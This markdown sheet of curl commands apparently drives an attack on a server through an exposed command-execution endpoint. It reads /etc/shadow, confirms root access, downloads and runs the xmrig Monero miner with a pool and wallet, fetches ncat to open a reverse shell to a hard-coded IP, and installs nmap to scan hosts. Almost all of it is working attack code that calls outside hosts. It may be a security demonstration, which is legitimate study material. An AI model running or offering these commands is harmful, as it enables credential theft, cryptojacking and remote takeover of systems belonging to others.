# Read the file /etc/shadow
```
curl $LOAD_BALANCER_URL:$PORT/etc/shadow
```

# Get a list of files
```
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=ls -la'
```

# Get my user (we are root)
```
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=uname -a'
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=whoami'
```

# Istall cryptominer
```
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=wget -O file.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz'
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=tar -xvf file.tar.gz
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=sleep 1 && nohup ./xmrig-6.16.4/xmrig --donate-level 100 -o xmr-us-east1.nanopool.org:14433 -k -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero'
```

# Check that cryptominer is installed
```
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=ps -aux'
```

# Open reverse shell
```
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat'
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=chmod +x ncat'
sleep 1 && nohup curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=./ncat 34.77.63.85 34444 -e /bin/bash' &> /dev/null & nc -lnvp 34444
```

# Install nmap and scan hostts
```
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=apt-get update; apt-get -y install nmap'
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=nmap -v scanme.nmap.org'
```





